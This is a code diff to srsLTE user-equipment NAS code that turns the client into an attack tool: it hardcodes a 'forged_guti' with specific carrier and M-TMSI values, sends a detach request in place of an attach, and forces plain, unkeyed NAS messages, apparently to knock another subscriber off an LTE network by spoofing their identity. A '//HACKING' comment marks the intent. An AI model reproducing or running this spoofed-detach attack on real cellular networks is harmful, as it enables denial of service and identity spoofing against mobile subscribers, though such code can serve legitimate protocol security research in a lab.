@@ -160,8 +160,12 @@ proc_outcome_t nas::rrc_connect_proc::init(srslte::establishment_cause_t cause_,
     if (nas_ptr->state == EMM_STATE_REGISTERED) {
       nas_ptr->gen_service_request(pdu);
     } else {
-      std::cout<<"gen attached!!!!"<<std::endl;
+      /*
+      ProcInfo("gen attach request");
       nas_ptr->gen_attach_request(pdu);
+      */
+      ProcInfo("gen detach here instead of attach");
+      nas_ptr->gen_detach_request(pdu, false);
     }
   }
 
@@ -315,11 +319,11 @@ void nas::init(usim_interface_nas* usim_, rrc_interface_nas* rrc_, gw_interface_
   
   LIBLTE_MME_EPS_MOBILE_ID_GUTI_STRUCT forged_guti;
 
-  forged_guti.m_tmsi = 0xeafa126f;
+  forged_guti.m_tmsi = 0xdc4401ae;
   forged_guti.mcc = 450;
-  forged_guti.mnc = 8;
-  forged_guti.mme_group_id = 37122;
-  forged_guti.mme_code = 0x02;
+  forged_guti.mnc = 5;
+  forged_guti.mme_group_id = 32913;
+  forged_guti.mme_code = 0x71;
 
   memcpy(&ctxt.guti, &forged_guti, sizeof(LIBLTE_MME_EPS_MOBILE_ID_GUTI_STRUCT));
   have_guti = true;
@@ -330,6 +334,8 @@ void nas::init(usim_interface_nas* usim_, rrc_interface_nas* rrc_, gw_interface_
   s_tmsi.mmec   = ctxt.guti.mme_code;
   s_tmsi.m_tmsi = ctxt.guti.m_tmsi;
   rrc->set_ue_identity(s_tmsi);
+  current_sec_hdr = LIBLTE_MME_SECURITY_HDR_TYPE_PLAIN_NAS;
+  ctxt.ksi  = LIBLTE_MME_NAS_KEY_SET_IDENTIFIER_NO_KEY_AVAILABLE;
 
   
   running = true;
@@ -2121,7 +2127,7 @@ void nas::send_detach_request(bool switch_off)
     detach_request.eps_mobile_id.type_of_id = LIBLTE_MME_EPS_MOBILE_ID_TYPE_GUTI;
     memcpy(&detach_request.eps_mobile_id.guti, &ctxt.guti, sizeof(LIBLTE_MME_EPS_MOBILE_ID_GUTI_STRUCT));
     detach_request.nas_ksi.tsc_flag = LIBLTE_MME_TYPE_OF_SECURITY_CONTEXT_FLAG_NATIVE;
-    detach_request.nas_ksi.nas_ksi  = 0;//ctxt.ksi;
+    detach_request.nas_ksi.nas_ksi  = LIBLTE_MME_NAS_KEY_SET_IDENTIFIER_NO_KEY_AVAILABLE;;//ctxt.ksi;
     nas_log->info("Sending detach request with GUTI 0x%x\n",detach_request.eps_mobile_id.guti.m_tmsi); // If sent as an Initial UE message, it cannot be ciphered
 
     //HACKING
@@ -2154,8 +2160,10 @@ void nas::send_detach_request(bool switch_off)
     }
   }
 
+
+  
   if (switch_off) {
-    enter_emm_deregistered();
+  //  enter_emm_deregistered();
   } else {
     // we are expecting a response from the core
     enter_state(EMM_STATE_DEREGISTERED_INITIATED);
@@ -2164,6 +2172,7 @@ void nas::send_detach_request(bool switch_off)
     nas_log->info("Starting T3421\n");
     t3421.run();
   }
+  
 
   if (rrc->is_connected()) {
     rrc->write_sdu(std::move(pdu));
